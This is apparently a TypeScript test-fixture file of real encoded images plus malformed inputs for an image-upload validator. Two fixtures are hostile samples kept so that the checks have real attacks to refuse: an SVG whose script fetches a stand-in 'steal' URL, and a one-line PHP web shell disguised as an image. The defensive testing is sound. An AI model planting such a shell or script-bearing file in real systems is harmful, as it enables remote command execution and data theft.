/**
 * ============================================================================
 * REAL ENCODED IMAGES, for tests that must not lie about what an image is.
 *
 * Every byte here came out of a real encoder (Pillow) and every one of these
 * buffers decodes in a browser. That matters more than it looks: the whole
 * point of `inspectImageBuffer` is to tell a genuine file from something
 * shaped like one, and a test that feeds it `Buffer.from('fake')` proves
 * nothing about either side of that line.
 *
 * WHY BASE64 IN SOURCE RATHER THAN BINARY FIXTURE FILES. Three reasons, in
 * order of how much they matter:
 *
 *   1. A reviewer can see exactly what the test uses. A committed `.png` is an
 *      opaque blob that nobody diffs, and a fixture that quietly changes is a
 *      test that quietly changes.
 *   2. No path resolution, so unit specs (rootDir `src`) and integration specs
 *      (rootDir `test`) share one definition instead of two copies that drift.
 *   3. They are tiny — 8x8 pixels, well under a kilobyte each.
 *
 * Excluded from the build: `tsconfig.build.json` excludes `test`, so none of
 * this ships.
 * ============================================================================
 */

const decode = (base64: string): Buffer => Buffer.from(base64, 'base64');

/** 8x8 solid red PNG. */
export const PNG_8X8 = decode(
  'iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAIAAABLbSncAAAAFUlEQVR42mM8pqHBgA0wMeAAg1MC' +
    'AN6qASbIT6nDAAAAAElFTkSuQmCC',
);

/** 8x8 solid red JPEG, quality 60 — a full JFIF file with SOI and EOI. */
export const JPEG_8X8 = decode(
  '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLikxMC' +
    '4pLSwzOko+MzZGNywtQFdBRkxOUlNSMj5aYVpQYEpRUk//2wBDAQ4ODhMREyYVFSZPNS01T09P' +
    'T09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0//wAARCAAIAA' +
    'gDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIE' +
    'AwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJi' +
    'coKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWW' +
    'l5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09f' +
    'b3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQA' +
    'AQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKj' +
    'U2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJma' +
    'oqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9' +
    'oADAMBAAIRAxEAPwDGooorgPrT/9k=',
);

/** 8x8 solid red lossy WebP — a RIFF container with a VP8 chunk. */
export const WEBP_8X8 = decode(
  'UklGRjgAAABXRUJQVlA4ICwAAACQAQCdASoIAAgAAoBCJaACdLoAA5gA/u2QP7oMs4abf/SbP+Js' +
    '/4mz45gAAA==',
);

/**
 * A minimal SVG. Refused on purpose — it is a document that can carry script,
 * not a picture. The `<script>` element is present precisely so the test is
 * about the thing that makes SVG dangerous.
 */
export const SVG_DOCUMENT = Buffer.from(
  '<?xml version="1.0"?>\n' +
    '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8">' +
    '<script>fetch("https://example.invalid/steal")</script>' +
    '<rect width="8" height="8" fill="red"/></svg>',
  'utf8',
);

/** A GIF — recognisable, and not on the accepted list. */
export const GIF_1X1 = decode(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
);

/**
 * Not an image at all: a text file whose name and declared type will claim
 * otherwise. This is the spoofed-extension case.
 */
export const NOT_AN_IMAGE = Buffer.from(
  '<?php system($_GET["c"]); ?>\n',
  'utf8',
);

/** A PNG signature with nothing behind it — the truncated-copy case. */
export const TRUNCATED_PNG = PNG_8X8.subarray(0, 12);

/** A JPEG with its end-of-image marker cut off. */
export const TRUNCATED_JPEG = JPEG_8X8.subarray(0, JPEG_8X8.length - 8);

/** Zero bytes. */
export const EMPTY = Buffer.alloc(0);

/**
 * A buffer of `size` bytes that still starts with a valid PNG signature, for
 * testing the size limit without also tripping the content check.
 *
 * The padding goes AFTER a complete, valid PNG, so the file remains decodable
 * — the only thing wrong with it is that it is too big, which is exactly what
 * the 413 test needs to isolate.
 */
export function oversizedPng(size: number): Buffer {
  if (size <= PNG_8X8.length) {
    throw new Error(`oversizedPng needs more than ${PNG_8X8.length} bytes`);
  }
  return Buffer.concat([PNG_8X8, Buffer.alloc(size - PNG_8X8.length, 0x00)]);
}
